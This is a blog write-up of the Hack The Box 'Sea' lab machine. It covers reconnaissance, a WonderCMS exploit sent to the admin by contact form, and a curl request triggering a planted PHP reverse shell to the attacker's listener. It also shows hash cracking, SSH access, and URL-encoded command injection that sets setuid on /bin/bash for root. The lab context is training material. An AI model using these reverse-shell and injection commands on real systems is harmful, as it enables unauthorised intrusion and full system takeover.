---
layout: post
title: 'Sea Walkthrough: Conquering Hack The Box Season 6 "Sea htb"'
date: 14-08-2024
categories: [HackTheBox]
tag: season 6  
---
# Sea Walkthrough: Conquering Hack The Box Season 6 "Sea Machine"

![](/img/1.png)

## Introduction  

 __Hack The Box Season 6, "Sea Machine," is a thrilling cybersecurity competition with a nautical theme, offering challenges that simulate real-world hacking scenarios. Participants test their skills in areas like web exploitation, cryptography, and network security. It's an exciting opportunity for both beginners and experts to sharpen their hacking abilities in a competitive, engaging environment.__



## Reconnaissance

 Network Scanning: as always, we will do nmap scan to know what is opened ports and it’s services in this machine.as always, we will do nmap scan to know what is opened ports and it’s services in this machine.

 ```
    -─(hu1k0㉿kali)-[~/Desktop/HTB]
    └─$ sh nmap.sh 10.10.11.28
    Performing initial scan on 10.10.11.28...
    Open ports: 22,80
    Performing detailed scan on 10.10.11.28...
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
    |   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
    |_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
    80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |_      httponly flag not set
    |_http-title: Sea - Home
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 then I browsed the site but didn't find anything interesting.
 
 ![](/img/vv1.png)
 ![](/img/vv2.png)
 

## directory discovery

 - __for directory discovery i use [ffuf](https://www.kali.org/tools/ffuf/) tool.__

 ```
  ┌──(hu1k0㉿kali)-[~/Desktop/HTB/reports] 
  └─$ ffuf -u http://sea.htb//FUZZ -w /usr/share/wordlists/dirb/common.txt  -mc 200,301,302,401,402,403 

 ```
 ![fufu1](/img/fffffu.png)
 
 - __first i go for '200' directories {contact.php}__
 - __i try some xss and sqli but no response__
  
  ![](/img/contact.png)

 - __then i tried all '301' directories but all give me Forbidden.__

  * messages , data , plugins , themes ...

 ![](/img/for.png)

 * then i back to http://sea.htb/ and press 'ctrl+u' to view-source:
  i notice this pass "http://10.10.11.28/themes/bike/css/style.css" which $bike$ is unique so i back and try to see what under this directory "/themes/bike/" 
 ```
  ┌──(hu1k0㉿kali)-[~/Desktop/HTB/reports]
  └─$ ffuf -u http://sea.htb/themes/bike/FUZZ -w /usr/share/wordlists/dirb/common.txt  -mc 200,301,302,401,402,403 -e .txt,.md,.php 
 ```
 ![](/img/rrrrr.png)

 - i go for '200' status

  README.md , version , summary , LICENSE..

 ![](/img/readme.png) 

 ![](/img/version.png)

## exploit

 - __so i go and search about it__  [Link.](https://gist.github.com/prodigiousMind/fc69a79629c4ba9ee88a7ad526043413) 

 ![](/img/exploit.png)

 - Usage: python3 exploit.py loginURL IP_Address Port\nexample: python3 exploit.py http://localhost/wondercms/loginURL 192.168.29.165 5252

 ![](/img/exlll.png)
 
 __We can send the link by Contact form to the admin__

 ![](/img/sewee.png)
 
 - now after reading the exploit script we will find it create a shell file in this pass {/themes/revshell-main/rev.php?lhost=" + ip + "&lport=" + port}

 - so we will send a request by [Curl](https://curl.se/docs/tooldocs.html)

 > curl 'http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.16.65&lport=9999'

 ![](/img/curl.png)
 
 > nc -nvlp 9999

 yup and we get the shell 

 ![](/img/shell.png) 
 
 now i will try to find any data to help me to get ``amay`` access
 
 ![](/img/db1.png)
 
 > cat database.js 

 ![](/img/333.png)

 * i found hash don't forget to remove a backslash \

 then i will use [johntheripper](https://www.kali.org/tools/john/) to crack this hash

 > john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

 - __now i have ```user``` and ```password``` i will to connect to ```ssh```__

 > ssh amay@10.10.11.28

 ![](/img/user.png)

## Privilege Escalation 

 - i download [linpeas.sh](https://github.com/XDev05/PEASS-ng/blob/master/linPEAS/linpeas.sh) to scan this machine 

 ![](/img/linpeas.png)

 > chmod +x linpeas.sh
 > ./linpeas.h

 ![](/img/biong.png)

 - __we have something open in localhost in this port so to access that there is a technique called Port Forwarding. It basically takes a user’s port and redirect it’s traffic to our port. To do that we have to run the following command.__

 > ssh -L 8888:10.10.16.6:8080 amay@10.10.16.6

 __and open in my browser ```127.0.0.1:8888``` and access with same ssh data..__

 ![](/img/yyyy.png)

 after intercepting the request I found this parameter (log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log) which looks valuable I tried some command injection but nothing happened then I asked ChatGPT and it told me:

 ![](/img/ssm1.png)

 - Here. I will try the command injection is work; so i will make file .

 I will try command injection. add a semicolon after [log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log;]  then URL encoded this command "touch /home/amay/hulk.hack" =>>"%74%6f%75%63%68%20%2f%68%6f%6d%65%2f%61%6d%61%79%2f%68%75%6c%6b%2e%68%61%63%6b" 

 ![](/img/sert.png)

 ![](/img/tert.png)

 - __BOOM!..it's WORK !!__
 
 - then if i can do this command "chmod u+s /bin/bash" it will gain me a root shill.because


         "u" stands for "user" (the owner of the file).

         "+s" sets the setuid bit.

         What Does setuid Do?

         When the setuid bit is set on an executable file, it allows a user to run the executable with the permissions of the file's owner. In the case of /bin/bash, which is typically owned by the root user, this means that any user who runs /bin/bash would start a shell with root privileges.

         and that what i do ..


 ```"chmod u+s /bin/bash" =>> "%63%68%6d%6f%64%20%20%75%2b%73%20%20%2f%62%69%6e%2f%62%61%73%68"```

 ![](/img/q33.png)

 * then go to ssh connection and type. "/bin/bash -p"

         The "-p" option in Bash stands for "privileged mode."
       with "-p", Bash skips this step, allowing the shell to retain its higher privileges (usually the effective user ID).
  
 > /bin/bash -p 

 ![](/img/root.png) 
